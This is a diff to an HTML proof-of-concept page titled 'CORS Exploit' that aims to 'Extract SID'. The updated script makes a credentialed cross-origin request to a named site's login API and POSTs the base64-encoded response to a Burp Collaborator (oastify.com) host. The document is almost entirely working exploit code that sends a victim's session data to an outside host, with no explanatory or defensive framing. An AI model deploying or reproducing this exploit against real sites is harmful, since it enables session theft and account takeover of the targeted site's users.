@@ -1,26 +1,38 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
 <body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
- 
-<script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
-    }
-  };
-  xhttp.open("GET", "https://wttmiw0qtgd86dxm2tpb9vlew52wqreg.oastify.com", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
-</script>
- 
+    <center>
+        <h2>CORS POC Exploit</h2>
+        <h3>Extract SID</h3>
+        <div id="demo">
+            <button type="button" onclick="cors()">Exploit</button>
+        </div>
+    </center>
+
+    <script>
+        function cors() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    // Send the captured response to Burp Collaborator
+                    fetch("https://wttmiw0qtgd86dxm2tpb9vlew52wqreg.oastify.com", {
+                        method: "POST",
+                        body: btoa(this.responseText), // Encode the data to avoid issues
+                        headers: {
+                            "Content-Type": "text/plain"
+                        }
+                    }).catch(err => console.error("Error sending to Collaborator:", err));
+                }
+            };
+            xhttp.open("GET", "https://quitplan.ycq2.org/api/login", true);
+            xhttp.withCredentials = true;
+            xhttp.send();
+        }
+    </script>
 </body>
 </html>
